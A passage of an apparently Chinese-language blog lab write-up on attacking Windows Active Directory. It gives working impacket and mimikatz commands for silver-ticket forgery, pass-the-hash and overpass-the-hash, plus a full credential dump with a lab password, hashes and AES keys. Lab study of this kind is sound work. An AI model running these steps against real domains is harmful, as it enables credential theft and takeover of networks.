<h3 id="Forge-silver-ticket-AD"><a href="#Forge-silver-ticket-AD" class="headerlink" title="Forge silver ticket (AD)"></a>Forge silver ticket (AD)</h3><p><code>secretsdump.py svc_account:&#39;Password!&#39;@192.168.43.147 -just-dc-user dc01$</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_9.png" alt=""></p>
<p><code>ticketer.py -nthash a87e3a8e476d22c8914b919c8dcc4e54 -domain-sid 1-5-21-2501991368-4163896689-842069156 -domain training.local -spn CIFS/DC01.TRAINING.LOCAL administrator</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_10.png" alt=""></p>
<h3 id="Pass-the-silver-ticket-AD"><a href="#Pass-the-silver-ticket-AD" class="headerlink" title="Pass the silver ticket (AD)"></a>Pass the silver ticket (AD)</h3><p><code>smbexec.py -k -no-pass training.local/administrator@DC01.training.local -target-ip  192.168.43.147 -debug</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_11.png" alt=""></p>
<h1 id="LAB-6-Pass-the-Hash"><a href="#LAB-6-Pass-the-Hash" class="headerlink" title="LAB 6 Pass the Hash"></a>LAB 6 Pass the Hash</h1><p>我覺得這篇寫得不錯<br><a href="https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67" target="_blank" rel="noopener">https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67</a></p>
<p>簡單來說透過之前取得的 NTLM hash 可以藉由 PTH 手法，利用 <code>psexec</code> 或是 <code>wmiexec</code> 取得 shell</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab6_1.png" alt=""></p>
<p>以滲透觀念來說就是 入侵 -&gt; 提權 -&gt; mimikatz (get ntlm hash) -&gt; PTH<br>也可以直接拿 shell<br><code>impacket-psexec -hashes :fc9bc6a6f510b2a92388f67962a33b1c Administrator@xor-dc01.xor.com</code><br><img src="/img/2020/windows_ad/exploit1.png" alt=""></p>
<h1 id="LAB-7-Over-pass-the-hash"><a href="#LAB-7-Over-pass-the-hash" class="headerlink" title="LAB 7 Over pass the hash"></a>LAB 7 Over pass the hash</h1><p>這個是利用 <code>AS-REQ</code> 傳送的是 client 的 NT hash 而不是明文的密碼這個特性來攻擊的<br>只要取得特定使用者的密碼 hash 就可以偽冒他的身分跟伺服器請求相關資源，算是建立在 pass the ticket 之上的手法<br>可以使用 <code>Mimikatz</code> 的 <code>sekurlsa::ekeys</code> 命令來執行<br>一樣我們需要先取得 PC01 的 shell<br>然後執行我們的 <code>mimikatz</code><br><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; exit</code><br><img src="/img/2020/windows_ad/windows_AD_lab7_1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 7098769 (00000000:006c5191)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/12/12 上午 01:26:08</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line"></span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       00a0fb4f4d296745d3e266ed09bb25c90432836725cee70e8bfeade5f57eb871</span><br><span class="line">	   aes128_hmac       f221e3f579e53e24a5ab594392a8b103</span><br><span class="line">	   rc4_hmac_nt       161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old      161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_md4           161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_nt_exp   161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old_exp  161cff084477fe596a5db81874498a24</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 7055940 (00000000:006baa44)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/12/12 上午 01:25:20</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line"></span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       00a0fb4f4d296745d3e266ed09bb25c90432836725cee70e8bfeade5f57eb871</span><br><span class="line">	   aes128_hmac       f221e3f579e53e24a5ab594392a8b103</span><br><span class="line">	   rc4_hmac_nt       161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old      161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_md4           161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_nt_exp   161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old_exp  161cff084477fe596a5db81874498a24</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 7019058 (00000000:006b1a32)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/12/12 上午 01:24:25</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line"></span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       00a0fb4f4d296745d3e266ed09bb25c90432836725cee70e8bfeade5f57eb871</span><br><span class="line">	   aes128_hmac       f221e3f579e53e24a5ab594392a8b103</span><br><span class="line">	   rc4_hmac_nt       161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old      161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_md4           161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_nt_exp   161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old_exp  161cff084477fe596a5db81874498a24</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 870587 (00000000:000d48bb)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:48:28</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line"></span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       00a0fb4f4d296745d3e266ed09bb25c90432836725cee70e8bfeade5f57eb871</span><br><span class="line">	   rc4_hmac_nt       161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old      161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_md4           161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_nt_exp   161cff084477fe596a5db81874498a24</span><br><span class="line">	   rc4_hmac_old_exp  161cff084477fe596a5db81874498a24</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 333037 (00000000:000514ed)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : BStar</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:45:56</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-1111</span><br><span class="line"></span><br><span class="line">	 * Username : BStar</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       db6bc5edd0ab0c08cf7497613b686dbee5569349967aa6d20b4fc46ed5237723</span><br><span class="line">	   rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">	   rc4_hmac_old      e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">	   rc4_md4           e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">	   rc4_hmac_nt_exp   e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">	   rc4_hmac_old_exp  e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71158 (00000000:000115f6)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:43:33</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line"></span><br><span class="line">	 * Username : PC01$</span><br><span class="line">	 * Domain   : training.local</span><br><span class="line">	 * Password : WHdM#&gt;lAUxKkMx5:JfI+neGysXzfl]d`mLqJt\_](c`D]hQ93hx&amp; *m=,&quot;B.-a-f-u$wk&lt;f]$zSA=XV[T#Hxmz_)F27SZGFJVAu_8G,8op1-:duKngXEBbp)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       aa6379f4121bcab01aa78c1e8cf942892d294622202cd319d84d3986715c8814</span><br><span class="line">	   aes128_hmac       3c5e76eb268cfb40fd1990787a808bce</span><br><span class="line">	   rc4_hmac_nt       3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old      3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_md4           3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_nt_exp   3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old_exp  3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71118 (00000000:000115ce)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:43:33</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line"></span><br><span class="line">	 * Username : PC01$</span><br><span class="line">	 * Domain   : training.local</span><br><span class="line">	 * Password : WHdM#&gt;lAUxKkMx5:JfI+neGysXzfl]d`mLqJt\_](c`D]hQ93hx&amp; *m=,&quot;B.-a-f-u$wk&lt;f]$zSA=XV[T#Hxmz_)F27SZGFJVAu_8G,8op1-:duKngXEBbp)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       aa6379f4121bcab01aa78c1e8cf942892d294622202cd319d84d3986715c8814</span><br><span class="line">	   aes128_hmac       3c5e76eb268cfb40fd1990787a808bce</span><br><span class="line">	   rc4_hmac_nt       3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old      3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_md4           3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_nt_exp   3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old_exp  3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC01$</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:43:31</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line"></span><br><span class="line">	 * Username : pc01$</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       123c35f404f978af627da4228ee721512c1eb2f0f2ce4648b96c7460fc53fd98</span><br><span class="line">	   rc4_hmac_nt       3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old      3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_md4           3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_nt_exp   3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old_exp  3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 47003 (00000000:0000b79b)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : UMFD-1</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:43:29</span><br><span class="line">SID               : S-1-5-96-0-1</span><br><span class="line"></span><br><span class="line">	 * Username : PC01$</span><br><span class="line">	 * Domain   : training.local</span><br><span class="line">	 * Password : WHdM#&gt;lAUxKkMx5:JfI+neGysXzfl]d`mLqJt\_](c`D]hQ93hx&amp; *m=,&quot;B.-a-f-u$wk&lt;f]$zSA=XV[T#Hxmz_)F27SZGFJVAu_8G,8op1-:duKngXEBbp)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       aa6379f4121bcab01aa78c1e8cf942892d294622202cd319d84d3986715c8814</span><br><span class="line">	   aes128_hmac       3c5e76eb268cfb40fd1990787a808bce</span><br><span class="line">	   rc4_hmac_nt       3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old      3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_md4           3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_nt_exp   3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old_exp  3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 46987 (00000000:0000b78b)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : UMFD-0</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:43:29</span><br><span class="line">SID               : S-1-5-96-0-0</span><br><span class="line"></span><br><span class="line">	 * Username : PC01$</span><br><span class="line">	 * Domain   : training.local</span><br><span class="line">	 * Password : WHdM#&gt;lAUxKkMx5:JfI+neGysXzfl]d`mLqJt\_](c`D]hQ93hx&amp; *m=,&quot;B.-a-f-u$wk&lt;f]$zSA=XV[T#Hxmz_)F27SZGFJVAu_8G,8op1-:duKngXEBbp)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       aa6379f4121bcab01aa78c1e8cf942892d294622202cd319d84d3986715c8814</span><br><span class="line">	   aes128_hmac       3c5e76eb268cfb40fd1990787a808bce</span><br><span class="line">	   rc4_hmac_nt       3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old      3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_md4           3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_nt_exp   3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old_exp  3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC01$</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/12/12 上午 12:43:27</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line"></span><br><span class="line">	 * Username : pc01$</span><br><span class="line">	 * Domain   : TRAINING.LOCAL</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	 * Key List :</span><br><span class="line">	   aes256_hmac       123c35f404f978af627da4228ee721512c1eb2f0f2ce4648b96c7460fc53fd98</span><br><span class="line">	   rc4_hmac_nt       3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old      3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_md4           3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_nt_exp   3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br><span class="line">	   rc4_hmac_old_exp  3b88f4ef6bbee7a9eaa3a3c1576a8ea1</span><br></pre></td></tr></table></figure></p>
<p>如果能順利挖掘到高權限使用者的 <code>aes256_hmac</code> 則可以透過 <code>impacket</code> 的工具偉造 TGT<br><code>impacket-getTGT  training.local/administrator -aesKey &quot;00a0fb4f4d296745d3e266ed09bb25c90432836725cee70e8bfeade5f57eb871&quot; -dc-ip 192.168.43.147</code><br><img src="/img/2020/windows_ad/windows_AD_lab7_2.png" alt=""><br>新版的 impacket 工具的 command 全部改成這樣了，寫這篇文章正好處於新舊版本交替@@<br>最後就跟上面的 lab 一樣<br><code>export KRB5CCNAME=administrator.ccache</code><br><code>impacket-psexec training.local/administrator@PC01.training.local -dc-ip 192.168.43.147  -target-ip 192.168.43.148 -k -no-pass</code><br><img src="/img/2020/windows_ad/windows_AD_lab7_3.png" alt=""><br>至此我們成功偽冒 <code>administrator</code> 向 PC01 進行請求</p>


                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/sda06407" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2021 AStar<br></p>
                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>